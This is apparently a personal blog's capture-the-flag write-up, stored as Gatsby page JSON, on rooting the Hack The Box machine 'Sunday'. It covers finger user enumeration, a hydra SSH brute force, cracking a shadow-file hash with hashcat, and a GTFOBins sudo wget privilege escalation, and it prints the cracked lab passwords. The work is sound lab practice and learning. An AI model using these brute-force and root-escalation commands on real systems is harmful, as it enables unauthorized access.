{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240812/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Machine Info</h2>\n<p>Sunday is an easy-rated, retired machine from Hack the Box. Well, I really didn’t like this one since it was mainly about guessing or bruteforcing the credentials, including hash-cracking.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 697px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/c32afba14811b7de0c2e0cd1af29167d/11663/sunday.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 91.14583333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADBUlEQVR42n2Su2/TUBTG8w/QvNM8Hb/t2I5fcd5tnNBCqtJXaIWgEhJCSEiAWGABBoZWYkdIqAsDIwghIXVhYGRnQGVh4g/5OHZSkdC0w0++5/o73733nBNJMTpmKE9BcYYlmAnlKV1pHhoiqTwtCkRx8l00kEoRGQPprI5omqD9BdLFMjrSeWOsPTX5bx1JaRpSBuFqSLYqSPaIVRXJPQULQxmNGxZevOriyUEH+rqBBU1BSiQNTwik4wiW1ow2NkxcURDflRHflxC7LyD2UEDirojoSETxZhXHJyP8OB7h59erePd9hMSOhOgKi7gnISEpSPAThAAJkdg9HvHbIuIkTPQUJO0KUqaGS6qM5q0WPv8+xMmnR/j28Q7e/zqAvEH/lgTENzlEt1nE+jwSJuXJwY0riORkGznOQY4lBEJ2kFcdZMUa1I6Fpx9e4s/bI3x58xrXjx5Ask3S1ZAP8nQLWYqzBu1RnBVsRPKCi7w4QRiTpQMSQSMyFVR9C88P9/H42TaEGtUwQ7UuGcjxdDBHxmxt/A1znYmhMG1mg9Nb6K/thjSXt2A2h/B6m2j727S3h+7KDkpKPXzR7GXOGNJTOQtl1UPT30C7v4Vmf0jrNXRXN9Dwh2gPrsFbHqIojQ+fyeenDSkoyXXwRhes2gVj6JA8HYK+hIJUR0Gs0028kALBaR2wlfb5hkFNymoTqtOHbA2gtz3Yl13UOutQ3T4U26d9H4ozIA3hDiBWly64YWBKT86UHaRLDhbLLhGsrXAvwzhhHJQkw9gTjXOxYZZzwdtV6H4FjGaFseyZEKm7lY4BzgxGzIXgVqEta6Q1Q825hnmeDJw2tFaLatkMx4fVHai1NmS3QZ2lOT3VNNsQzEYYTzd1xrBA7ReMHjXCp4J3kaUTc5wH0fCpvp3wgEAn6KSZ7M3mnzOH43H4NxI53g6bFg7zlCb3/9jMG+yAouyCNWyIjkV1IwyqLY2PVlulb5dm0MO8vLM1PIWeHtSLqdgoqYTigpEbVIYWzWpjvtnkhn8BJR8gm/Y1kdMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c32afba14811b7de0c2e0cd1af29167d/a59e9/sunday.webp 192w,\n/static/c32afba14811b7de0c2e0cd1af29167d/0ca9f/sunday.webp 384w,\n/static/c32afba14811b7de0c2e0cd1af29167d/dc6fe/sunday.webp 697w\"\n              sizes=\"(max-width: 697px) 100vw, 697px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c32afba14811b7de0c2e0cd1af29167d/3b721/sunday.png 192w,\n/static/c32afba14811b7de0c2e0cd1af29167d/66595/sunday.png 384w,\n/static/c32afba14811b7de0c2e0cd1af29167d/11663/sunday.png 697w\"\n            sizes=\"(max-width: 697px) 100vw, 697px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c32afba14811b7de0c2e0cd1af29167d/11663/sunday.png\"\n            alt=\"sunday\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>But it was still a good machine to repeat some basic stuffs which we don’t always have in our mind.</p>\n<blockquote>\n<p>As always, let’s dive into the machine!</p>\n</blockquote>\n<h2>2. Recon</h2>\n<p>Starting with nmap scan:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]\r\n└─$ sudo nmap 10.10.10.76 -Pn -sC -sV                                \r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 03:45 EDT\r\nStats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\r\nService scan Timing: About 66.67% done; ETC: 03:48 (0:00:45 remaining)\r\nNmap scan report for 10.10.10.76\r\nHost is up (0.19s latency).\r\nNot shown: 997 closed tcp ports (reset)\r\nPORT    STATE SERVICE VERSION\r\n79/tcp  open  finger?\r\n|_finger: No one logged on\\x0D\r\n| fingerprint-strings: \r\n|   GenericLines: \r\n|     No one logged on\r\n|   GetRequest: \r\n|     Login Name TTY Idle When Where\r\n|     HTTP/1.0 ???\r\n|   HTTPOptions: \r\n|     Login Name TTY Idle When Where\r\n|     HTTP/1.0 ???\r\n|     OPTIONS ???\r\n|   Help: \r\n|     Login Name TTY Idle When Where\r\n|     HELP ???\r\n|   RTSPRequest: \r\n|     Login Name TTY Idle When Where\r\n|     OPTIONS ???\r\n|     RTSP/1.0 ???\r\n|   SSLSessionReq, TerminalServerCookie: \r\n|_    Login Name TTY Idle When Where\r\n111/tcp open  rpcbind 2-4 (RPC #100000)\r\n515/tcp open  printer</code></pre></div>\n<p>There is a service named “finger” on port 79. After a quick search:</p>\n<blockquote>\n<p>The Finger program/service is utilized for retrieving details about computer users. Typically, the information provided includes the user’s login name, full name, and, in some cases, additional details.</p>\n</blockquote>\n<p>I can’t justify why someone would use this kind of service, but whatever.</p>\n<h2>3. Enumeration</h2>\n<p>Let’s start with a basic interaction</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]\r\n└─$ echo \"root\" | nc -vn 10.10.10.76 79\r\n(UNKNOWN) [10.10.10.76] 79 (finger) open\r\nLogin       Name               TTY         Idle    When    Where\r\nroot     Super-User            ssh          &lt;Dec  7, 2023> 10.10.14.46  </code></pre></div>\n<p>So it indeed shows us username.</p>\n<p>Let’s try user enumeration from PentestMonkey.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">──(hosan㉿kali)-[~/oscp/htb-box/sunday/finger-user-enum-1.0]\r\n└─$ perl finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.76 -p 79\r\nStarting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )\r\n\r\n ----------------------------------------------------------\r\n|                   Scan Information                       |\r\n ----------------------------------------------------------\r\n\r\nWorker Processes ......... 5\r\nUsernames file ........... /usr/share/wordlists/seclists/Usernames/Names/names.txt\r\nTarget count ............. 1\r\nUsername count ........... 10177\r\nTarget TCP port .......... 79\r\nQuery timeout ............ 5 secs\r\nRelay Server ............. Not used\r\n\r\nroot@10.10.10.76: root     Super-User            ssh          &lt;Dec  7, 2023> 10.10.14.46         ..\r\nsammy@10.10.10.76: sammy           ???            ssh          &lt;Apr 13, 2022> 10.10.14.13         ..\r\nsunny@10.10.10.76: sunny           ???            ssh          &lt;Apr 13, 2022> 10.10.14.13         ..</code></pre></div>\n<p>So we’ve got three user: root, sammy, sunny. Pretty obviously, root is (for now) out of scope.</p>\n<h2>4. Initial Foothold</h2>\n<p>Hmm, but I can’t find any remote connection services. Let’s try nmap once more with -p-</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Not shown: 65530 closed tcp ports (reset)\r\nPORT      STATE SERVICE   REASON\r\n79/tcp    open  finger    syn-ack ttl 59\r\n111/tcp   open  rpcbind   syn-ack ttl 63\r\n515/tcp   open  printer   syn-ack ttl 59\r\n6787/tcp  open  smc-admin syn-ack ttl 59\r\n22022/tcp open  unknown   syn-ack ttl 63</code></pre></div>\n<p>Oh, so there was a ssh service running on port 22022!</p>\n<p>But here was a tricky part: we had to guess the password of our user. It happens if we look at some really old machines from HTB. I tried with days.txt since our user and machine’s name is sunday.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]\r\n└─$ hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/days.txt ssh://10.10.10.76:22022  \r\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\r\n\r\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-18 05:05:17\r\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\r\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 12480 login tries (l:2/p:6240), ~780 tries per task\r\n[DATA] attacking ssh://10.10.10.76:22022/\r\n[STATUS] 166.00 tries/min, 166 tries in 00:01h, 12315 to do in 01:15h, 15 active\r\n[STATUS] 155.33 tries/min, 466 tries in 00:03h, 12015 to do in 01:18h, 15 active\r\n[STATUS] 141.57 tries/min, 991 tries in 00:07h, 11490 to do in 01:22h, 15 active\r\n[STATUS] 136.07 tries/min, 2041 tries in 00:15h, 10440 to do in 01:17h, 15 active\r\n[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday</code></pre></div>\n<p>so as a result, we’ve got sunny:sunday.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ ssh sunny@10.10.10.76 -p 22022                                              \r\n(sunny@10.10.10.76) Password: \r\nLast login: Wed Apr 13 15:35:50 2022 from 10.10.14.13\r\nOracle Solaris 11.4.42.111.0                  Assembled December 2021\r\nsunny@sunday:~$ </code></pre></div>\n<p>Got it. But it is truly no fun to brute force or guess some random passwords.</p>\n<h2>5. Shell as sammy &#x26; root</h2>\n<p>I couldn’t open user.txt. So let’s try privesc.</p>\n<p>After playing around for a while, I found this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">sunny@sunday:/backup$ cat agent22.backup \r\nmysql:NP:::::::\r\nopenldap:*LK*:::::::\r\nwebservd:*LK*:::::::\r\npostgres:NP:::::::\r\nsvctag:*LK*:6445::::::\r\nnobody:*LK*:6445::::::\r\nnoaccess:*LK*:6445::::::\r\nnobody4:*LK*:6445::::::\r\nsammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::\r\nsunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::</code></pre></div>\n<p>So we have this password hash, and I really hate it. And don’t forget, that :6445.. at the end is not relevant.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]\r\n└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt\r\nhashcat (v6.2.6) starting in autodetect mode\r\n(used autodetection)\r\n\r\n\r\n┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]\r\n└─$ cat cracked.txt \r\n$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!</code></pre></div>\n<p>So I logged in as sammy. sudo -l shows us:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">-bash-5.1$ sudo -l\r\nUser sammy may run the following commands on sunday:\r\n    (ALL) ALL\r\n    (root) NOPASSWD: /usr/bin/wget</code></pre></div>\n<p>Looking at GTFObins:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">-bash-5.1$ TF=$(mktemp)\r\n-bash-5.1$ chmod +x $TF\r\n-bash-5.1$ echo -e '#!/bin/sh\\n/bin/sh 1>&amp;0' >$TF\r\n-bash-5.1$ sudo wget --use-askpass=$TF 0\r\nroot@sunday:/home/sammy# </code></pre></div>\n<p>So I got root. That’s it!</p>\n<h2>6. Review</h2>\n<p>Nah, I really didn’t like this one. I tried to find a more “logical” way to get into the machine, but at the end, it was just brute-forcing…</p>\n<h2>7. Source</h2>\n<ul>\n<li>HTB 2024</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Hack The Box Sunday","summary":"Solving \"Sunday\" machine from HTB","date":"2024.08.12.","before":"2024.08.09.","after":"2024.08.13.","categories":["hackthebox","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADBUlEQVR42n2Su2/TUBTG8w/QvNM8Hb/t2I5fcd5tnNBCqtJXaIWgEhJCSEiAWGABBoZWYkdIqAsDIwghIXVhYGRnQGVh4g/5OHZSkdC0w0++5/o73733nBNJMTpmKE9BcYYlmAnlKV1pHhoiqTwtCkRx8l00kEoRGQPprI5omqD9BdLFMjrSeWOsPTX5bx1JaRpSBuFqSLYqSPaIVRXJPQULQxmNGxZevOriyUEH+rqBBU1BSiQNTwik4wiW1ow2NkxcURDflRHflxC7LyD2UEDirojoSETxZhXHJyP8OB7h59erePd9hMSOhOgKi7gnISEpSPAThAAJkdg9HvHbIuIkTPQUJO0KUqaGS6qM5q0WPv8+xMmnR/j28Q7e/zqAvEH/lgTENzlEt1nE+jwSJuXJwY0riORkGznOQY4lBEJ2kFcdZMUa1I6Fpx9e4s/bI3x58xrXjx5Ask3S1ZAP8nQLWYqzBu1RnBVsRPKCi7w4QRiTpQMSQSMyFVR9C88P9/H42TaEGtUwQ7UuGcjxdDBHxmxt/A1znYmhMG1mg9Nb6K/thjSXt2A2h/B6m2j727S3h+7KDkpKPXzR7GXOGNJTOQtl1UPT30C7v4Vmf0jrNXRXN9Dwh2gPrsFbHqIojQ+fyeenDSkoyXXwRhes2gVj6JA8HYK+hIJUR0Gs0028kALBaR2wlfb5hkFNymoTqtOHbA2gtz3Yl13UOutQ3T4U26d9H4ozIA3hDiBWly64YWBKT86UHaRLDhbLLhGsrXAvwzhhHJQkw9gTjXOxYZZzwdtV6H4FjGaFseyZEKm7lY4BzgxGzIXgVqEta6Q1Q825hnmeDJw2tFaLatkMx4fVHai1NmS3QZ2lOT3VNNsQzEYYTzd1xrBA7ReMHjXCp4J3kaUTc5wH0fCpvp3wgEAn6KSZ7M3mnzOH43H4NxI53g6bFg7zlCb3/9jMG+yAouyCNWyIjkV1IwyqLY2PVlulb5dm0MO8vLM1PIWeHtSLqdgoqYTigpEbVIYWzWpjvtnkhn8BJR8gm/Y1kdMAAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/c32afba14811b7de0c2e0cd1af29167d/483ac/sunday.png","srcSet":"/static/c32afba14811b7de0c2e0cd1af29167d/738c5/sunday.png 174w,\n/static/c32afba14811b7de0c2e0cd1af29167d/5c30f/sunday.png 349w,\n/static/c32afba14811b7de0c2e0cd1af29167d/483ac/sunday.png 697w","sizes":"(min-width: 697px) 697px, 100vw"},"sources":[{"srcSet":"/static/c32afba14811b7de0c2e0cd1af29167d/21788/sunday.webp 174w,\n/static/c32afba14811b7de0c2e0cd1af29167d/8634e/sunday.webp 349w,\n/static/c32afba14811b7de0c2e0cd1af29167d/d12de/sunday.webp 697w","type":"image/webp","sizes":"(min-width: 697px) 697px, 100vw"}]},"width":697,"height":636}},"publicURL":"/static/c32afba14811b7de0c2e0cd1af29167d/sunday.png"}}}}]}},"pageContext":{"slug":"/240812/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}